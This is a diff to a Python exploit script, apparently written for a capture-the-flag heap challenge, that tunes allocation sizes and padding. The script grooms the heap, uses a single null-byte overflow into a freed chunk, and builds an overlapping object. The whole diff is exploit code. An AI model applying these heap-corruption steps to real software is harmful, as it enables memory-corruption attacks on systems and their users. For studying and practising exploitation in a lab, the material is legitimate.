@@ -90,7 +90,7 @@ def stage_0_groom_the_heap(target):
 def stage_1_create_large_boots(target):
     #for debugging, lets read the boots here after stage
     create_new_boot(target, 0x100, 'AAAAA')
-    create_new_boot(target, 0x208, 'BBBBB')
+    create_new_boot(target, 0x250, 'BBBBB')
     create_new_boot(target, 0x100, 'CCCCC')
     print 'Stage 1: Large Boots Allocated'
     read_boot(target, 0)
@@ -100,15 +100,15 @@ def stage_2_create_and_shrink(target):
     delete_boot(target, 1) # free B
     print 'Stage 2: Hole Created'
     read_boot(target, 0)
-    edit_boot(target, 0, 0x100*'A'+ p64(0x0000)) #overflow
+    edit_boot(target, 0, 0x100*'A'+ p64(0x00)) #overflow
     print 'Stage 2: Hole Overflowed'
     read_boot(target, 1)
 
 
 def stage_3_make_smaller_chunks_in_freed_block(target):
     #for debugging, lets read the boots here after stage
-    create_new_boot(target, 0x100, '11111') #B1 allocation
-    create_new_boot(target, 0x80, '22222') #B2 allocation
+    create_new_boot(target, 0x80, '1'*0x20) #B1 allocation
+    create_new_boot(target, 0x80, '2'*0x20) #B2 allocation
     print 'Stage 3: Hole Overwritten'
     read_boot(target, 1)
 
@@ -122,7 +122,7 @@ def stage_4_free_blocks(target):
 
 
 def stage_5_create_overlapping_object(target):
-    create_new_boot(target, 0x210, '66666')
+    create_new_boot(target, 0x200, '6'*0x150)
     print 'Stage 5: Overlapping Object Created'
     read_boot(target, 1)
 
